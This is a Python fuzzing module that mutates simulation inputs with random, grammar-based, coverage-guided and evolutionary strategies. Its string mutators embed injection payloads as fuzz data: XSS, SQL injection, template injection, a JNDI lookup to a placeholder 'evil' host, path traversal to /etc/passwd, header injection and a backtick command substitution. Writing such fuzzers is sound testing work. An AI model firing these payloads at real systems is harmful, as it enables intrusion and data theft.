"""AION Fuzzer - Mutation-based and grammar-aware fuzzing for simulation inputs.

Provides:
- Fuzzer: Generates fuzzed inputs using multiple strategies:
  mutation, grammar-based, coverage-guided, and evolutionary.
- MutationEngine: Core mutation operators for data transformation.
"""

from __future__ import annotations

import copy
import random
import string
from typing import Any, Callable, Dict, List, Optional, Set

import structlog

from aion.simulation.types import FuzzStrategy

logger = structlog.get_logger(__name__)


class MutationEngine:
    """Core mutation operators for fuzzing.

    Applies random mutations to input data:
    - String mutations: insert, delete, flip, repeat, truncate.
    - Numeric mutations: boundary values, overflow, sign flip.
    - Structure mutations: add/remove keys, nest, flatten.
    - Type mutations: change value types.
    """

    def __init__(self, rng: Optional[random.Random] = None) -> None:
        self._rng = rng or random.Random()

    def mutate(self, data: Any, depth: int = 0) -> Any:
        """Apply a random mutation to data."""
        if depth > 5:
            return data

        if isinstance(data, str):
            return self._mutate_string(data)
        elif isinstance(data, (int, float)):
            return self._mutate_number(data)
        elif isinstance(data, bool):
            return not data
        elif isinstance(data, dict):
            return self._mutate_dict(data, depth)
        elif isinstance(data, list):
            return self._mutate_list(data, depth)
        elif data is None:
            return self._rng.choice(["", 0, False, [], {}])
        return data

    def _mutate_string(self, s: str) -> str:
        if not s:
            return self._rng.choice([
                "",
                "x" * 10000,
                "\x00",
                "\n\r\t",
                "<script>alert(1)</script>",
            ])

        mutation = self._rng.choice([
            "insert", "delete", "flip", "repeat", "truncate",
            "empty", "huge", "special", "unicode", "format_str",
        ])

        if mutation == "insert":
            pos = self._rng.randint(0, len(s))
            char = self._rng.choice(string.printable)
            return s[:pos] + char + s[pos:]
        elif mutation == "delete":
            if len(s) <= 1:
                return ""
            pos = self._rng.randint(0, len(s) - 1)
            return s[:pos] + s[pos + 1:]
        elif mutation == "flip":
            pos = self._rng.randint(0, len(s) - 1)
            c = chr(ord(s[pos]) ^ self._rng.randint(1, 255))
            return s[:pos] + c + s[pos + 1:]
        elif mutation == "repeat":
            return s * self._rng.randint(2, 100)
        elif mutation == "truncate":
            return s[:self._rng.randint(0, max(1, len(s) // 2))]
        elif mutation == "empty":
            return ""
        elif mutation == "huge":
            return s[0] * self._rng.randint(10000, 100000)
        elif mutation == "special":
            return self._rng.choice([
                "\x00\x01\x02\xff",
                "\u202e\u200b",  # RTL override, zero-width space
                "'; DROP TABLE --",
                "{{7*7}}",
                "${jndi:ldap://evil}",
                "../../../etc/passwd",
                "%s%s%s%s%s",
                "\r\nInjected-Header: value",
            ])
        elif mutation == "unicode":
            return "".join(
                chr(self._rng.randint(0x100, 0xFFFF))
                for _ in range(self._rng.randint(1, 50))
            )
        elif mutation == "format_str":
            return self._rng.choice(["%n%n%n", "{0}" * 20, "%x" * 50])
        return s

    def _mutate_number(self, n: Any) -> Any:
        mutation = self._rng.choice([
            "boundary", "overflow", "sign", "zero", "nan", "type_change",
        ])

        if mutation == "boundary":
            return self._rng.choice([0, 1, -1, 2**31 - 1, -(2**31), 2**63 - 1])
        elif mutation == "overflow":
            return n * self._rng.choice([2**16, 2**32, 2**64])
        elif mutation == "sign":
            return -n
        elif mutation == "zero":
            return 0
        elif mutation == "nan":
            return float("nan") if isinstance(n, float) else 0
        elif mutation == "type_change":
            return str(n)
        return n

    def _mutate_dict(self, d: Dict, depth: int) -> Dict:
        result = copy.copy(d)
        mutation = self._rng.choice([
            "mutate_value", "add_key", "remove_key", "empty", "nest",
        ])

        if mutation == "mutate_value" and result:
            key = self._rng.choice(list(result.keys()))
            result[key] = self.mutate(result[key], depth + 1)
        elif mutation == "add_key":
            result[f"fuzz_{self._rng.randint(0, 999)}"] = self.mutate(None, depth + 1)
        elif mutation == "remove_key" and result:
            key = self._rng.choice(list(result.keys()))
            del result[key]
        elif mutation == "empty":
            return {}
        elif mutation == "nest":
            result["nested"] = copy.deepcopy(result)
        return result

    def _mutate_list(self, lst: List, depth: int) -> List:
        result = list(lst)
        mutation = self._rng.choice([
            "mutate_element", "add", "remove", "empty", "huge",
        ])

        if mutation == "mutate_element" and result:
            idx = self._rng.randint(0, len(result) - 1)
            result[idx] = self.mutate(result[idx], depth + 1)
        elif mutation == "add":
            result.append(self.mutate(None, depth + 1))
        elif mutation == "remove" and result:
            result.pop(self._rng.randint(0, len(result) - 1))
        elif mutation == "empty":
            return []
        elif mutation == "huge":
            return result * self._rng.randint(100, 1000)
        return result


class Fuzzer:
    """Generates fuzzed inputs using multiple strategies.

    Strategies:
    - RANDOM: Purely random generation.
    - MUTATION: Mutate existing valid inputs.
    - GRAMMAR: Generate from a grammar/schema.
    - COVERAGE_GUIDED: Focus mutations on unexplored code paths.
    - EVOLUTIONARY: Evolve inputs that trigger new behaviors.
    """

    def __init__(
        self,
        strategy: FuzzStrategy = FuzzStrategy.MUTATION,
        seed: Optional[int] = None,
    ) -> None:
        self._strategy = strategy
        self._rng = random.Random(seed)
        self._mutation_engine = MutationEngine(self._rng)

        # Corpus of interesting inputs
        self._corpus: List[Dict[str, Any]] = []
        self._interesting: List[Dict[str, Any]] = []

        # Coverage tracking (for coverage-guided)
        self._seen_paths: Set[str] = set()

        # Stats
        self._total_generated = 0
        self._unique_behaviors = 0

    # -- Generation --

    def generate(
        self,
        base_input: Optional[Dict[str, Any]] = None,
        count: int = 1,
    ) -> List[Dict[str, Any]]:
        """Generate fuzzed inputs.

        Args:
            base_input: Input to mutate (for mutation strategy).
            count: Number of inputs to generate.

        Returns:
            List of fuzzed input dictionaries.
        """
        results: List[Dict[str, Any]] = []

        for _ in range(count):
            if self._strategy == FuzzStrategy.RANDOM:
                fuzzed = self._generate_random()
            elif self._strategy == FuzzStrategy.MUTATION:
                fuzzed = self._generate_mutation(base_input)
            elif self._strategy == FuzzStrategy.GRAMMAR:
                fuzzed = self._generate_grammar()
            elif self._strategy == FuzzStrategy.COVERAGE_GUIDED:
                fuzzed = self._generate_coverage_guided(base_input)
            elif self._strategy == FuzzStrategy.EVOLUTIONARY:
                fuzzed = self._generate_evolutionary(base_input)
            else:
                fuzzed = self._generate_random()

            results.append(fuzzed)
            self._total_generated += 1

        return results

    def add_to_corpus(self, inp: Dict[str, Any]) -> None:
        """Add an input to the corpus (for mutation/evolutionary)."""
        self._corpus.append(inp)

    def mark_interesting(self, inp: Dict[str, Any], path: str = "") -> None:
        """Mark an input as interesting (triggered new behavior)."""
        self._interesting.append(inp)
        if path:
            if path not in self._seen_paths:
                self._seen_paths.add(path)
                self._unique_behaviors += 1

    def _generate_random(self) -> Dict[str, Any]:
        """Generate fully random input."""
        message_pool = [
            "",
            "A" * self._rng.randint(1, 100_000),
            self._rng.choice(["null", "undefined", "NaN", "Infinity"]),
            "".join(chr(self._rng.randint(0, 0xFFFF)) for _ in range(50)),
            self._rng.choice([
                "DROP TABLE *;",
                "<img onerror=alert(1)>",
                "{{constructor.constructor('return this')()}}",
                "${7*7}",
                "`id`",
            ]),
        ]
        return {"message": self._rng.choice(message_pool)}

    def _generate_mutation(
        self,
        base: Optional[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Mutate a base input."""
        if base is None:
            if self._corpus:
                base = self._rng.choice(self._corpus)
            else:
                return self._generate_random()

        mutated = copy.deepcopy(base)
        # Apply 1-3 mutations
        for _ in range(self._rng.randint(1, 3)):
            mutated = self._mutation_engine.mutate(mutated)
            if not isinstance(mutated, dict):
                mutated = {"message": str(mutated)}
        return mutated

    def _generate_grammar(self) -> Dict[str, Any]:
        """Generate from a simple grammar of message types."""
        grammars = [
            {"message": self._rng.choice(["help", "search", "create", "delete", "update"])},
            {"message": f"Use tool {self._rng.choice(['search', 'write', 'compute'])}"},
            {"action": self._rng.choice(["submit", "cancel", "retry"]), "data": {}},
            {"command": f"/{self._rng.choice(['help', 'status', 'reset'])}"},
        ]
        base = self._rng.choice(grammars)
        # Occasionally mutate grammar output
        if self._rng.random() < 0.3:
            base = self._mutation_engine.mutate(base)
            if not isinstance(base, dict):
                base = {"message": str(base)}
        return base

    def _generate_coverage_guided(
        self,
        base: Optional[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Prefer mutations of inputs that led to new coverage."""
        if self._interesting:
            source = self._rng.choice(self._interesting)
        elif base:
            source = base
        else:
            return self._generate_random()

        return self._generate_mutation(source)

    def _generate_evolutionary(
        self,
        base: Optional[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Evolve interesting inputs over generations."""
        if not self._interesting:
            return self._generate_mutation(base)

        # Tournament selection: pick 2, prefer the one added later (likely more interesting)
        candidates = self._rng.sample(
            self._interesting,
            min(2, len(self._interesting)),
        )
        parent = candidates[-1]
        return self._generate_mutation(parent)

    # -- Stats --

    @property
    def stats(self) -> Dict[str, Any]:
        return {
            "strategy": self._strategy.value,
            "total_generated": self._total_generated,
            "corpus_size": len(self._corpus),
            "interesting_count": len(self._interesting),
            "unique_behaviors": self._unique_behaviors,
            "coverage_paths": len(self._seen_paths),
        }

    def reset(self) -> None:
        self._corpus.clear()
        self._interesting.clear()
        self._seen_paths.clear()
        self._total_generated = 0
        self._unique_behaviors = 0
